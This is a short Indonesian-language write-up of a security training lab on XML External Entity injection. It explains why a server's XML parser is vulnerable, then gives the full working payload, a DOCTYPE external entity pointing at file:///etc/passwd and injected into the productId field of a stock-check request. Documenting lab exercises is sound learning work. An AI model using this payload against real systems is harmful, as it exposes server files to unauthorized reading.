# Write-Up: XXE Injection - Lab Retrieve Files

## Informasi Lab

*   **Nama Lab**: Exploiting XXE using external entities to retrieve files
*   **Tingkat** : Practicioner
*   **Vulnerability**: XML External Entity (XXE) Injection

## Analisis Kerentanan

Aplikasi memproses input data dari pengguna dalam format XML. Kerentanan muncul ketika parser XML di sisi server dikonfigurasi untuk mengizinkan entitas eksternal. Hal ini memungkinkan penyerang untuk mendefinisikan entitas yang mengacu pada sebuah file di sistem server.

## Langkah-Langkah Eksploitasi

**Suntikkan Payload XML**:
    *   Modifikasi data XML di Burp Suite dengan menyisipkan deklarasi `DOCTYPE` dan `ENTITY` di antara deklarasi XML dan elemen root `<stockCheck>`.
    *   **Payload yang disuntikkan**:
        ```xml
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

**Panggil Entitas**:
    *   Setelah entitas `xxe` didefinisikan, panggil entitas tersebut di dalam elemen `<productId>` dengan mengubah nilainya menjadi `&xxe;`.

**Payload XML Lanjutan**:
    *   Berikut adalah isi XML lengkap yang diubah:
        ```xml
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <stockCheck>
          <productId>&xxe;</productId>
          <storeId>1</storeId>
        </stockCheck>
        ```

## Bukti
<img width="1243" height="658" alt="image" src="https://github.com/user-attachments/assets/cbc148c3-5d3e-437f-8d8d-5198a8aff73e" />

<img width="1243" height="626" alt="image" src="https://github.com/user-attachments/assets/4cfb8637-db7a-45a4-ab49-8f4b8a0a13eb" />

<img width="1262" height="571" alt="image" src="https://github.com/user-attachments/assets/a0fa5c5c-49f8-425a-9786-c27560e0b9eb" />

<img width="1235" height="688" alt="image" src="https://github.com/user-attachments/assets/f1c56973-5f1b-4a35-b48d-b3c053d71681" />



        

